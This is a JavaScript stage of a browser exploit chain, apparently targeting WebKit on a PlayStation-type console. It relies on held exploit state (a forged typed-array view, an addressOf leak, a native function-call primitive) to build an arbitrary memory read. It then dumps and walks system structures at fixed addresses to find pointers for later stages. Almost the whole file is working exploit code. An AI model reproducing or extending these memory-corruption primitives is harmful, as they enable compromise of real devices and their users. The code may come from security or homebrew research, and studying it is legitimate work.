// Orbis structure walk, v1. The address-directed read at 0x12AB8000
// (capture 0d7c9872) returned a mapped structure: +0x00 u64 0x60, +0x08
// "ORBI" magic + u32 5, +0x10 u32 0x14008001, +0x18 pointer 0x12AB1B40.
// This probe: (1) reads 192 bytes at 0x12AB8000 (full readAt width);
// (2) follows the +0x18 pointer and reads 192 bytes at 0x12AB1B40;
// (3) scans the target struct for further pointers into the 0x12AB region
// and reports them for the next hop. Read-only; deaths are browser-local
// (WebProcess reload); safe mark() helper.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase))
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function toHex(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++)
      out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
  }
  function toAscii(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++) {
      var ch = bytes[i];
      out += (ch >= 32 && ch < 127) ? String.fromCharCode(ch) : ".";
    }
    return out;
  }
  function u32s(bytes) {
    var out = [];
    for (var i = 0; i + 4 <= bytes.length; i += 4) {
      out.push((bytes[i]) | (bytes[i + 1] << 8) |
               (bytes[i + 2] << 16) | (bytes[i + 3] << 24));
    }
    return out;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("orbis_preflight");
  phase = "region_read";
  var headBytes = readAt(0x12ab8000, 192);
  var headHex = toHex(headBytes);
  var headAscii = toAscii(headBytes);
  mark("orbis_head_read");
  phase = "follow_pointer";
  var followBytes = [], followHex = "", followAscii = "";
  var followPointers = "";
  var target = 0x12ab1b40;
  try {
    followBytes = readAt(target, 192);
    followHex = toHex(followBytes);
    followAscii = toAscii(followBytes);
    var words = u32s(followBytes);
    for (var w = 0; w < words.length; w++) {
      var v = words[w] >>> 0;
      if (v >= 0x12000000 && v < 0x13000000) {
        followPointers += "+" + (w * 4).toString(16) + ":" +
          v.toString(16) + " ";
      }
    }
  } catch (followError) {
    followHex = "ERR:" + String(followError).slice(0, 80);
  }
  mark("orbis_follow_read");
  phase = "scan_head_ptrs";
  var headPointers = "";
  var headWords = u32s(headBytes);
  for (var w2 = 0; w2 < headWords.length; w2++) {
    var v2 = headWords[w2] >>> 0;
    if (v2 >= 0x12000000 && v2 < 0x13000000) {
      headPointers += "+" + (w2 * 4).toString(16) + ":" +
        v2.toString(16) + " ";
    }
  }
  var after = native.call("getpid", []);
  mark("orbis_done");
  result = { id: "orbis_walk_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { head_hex: headHex, head_ascii: headAscii,
      head_ptrs: headPointers.trim(),
      follow_target: "0x12ab1b40",
      follow_hex: followHex, follow_ascii: followAscii,
      follow_ptrs: followPointers.trim(),
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "orbis_walk_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
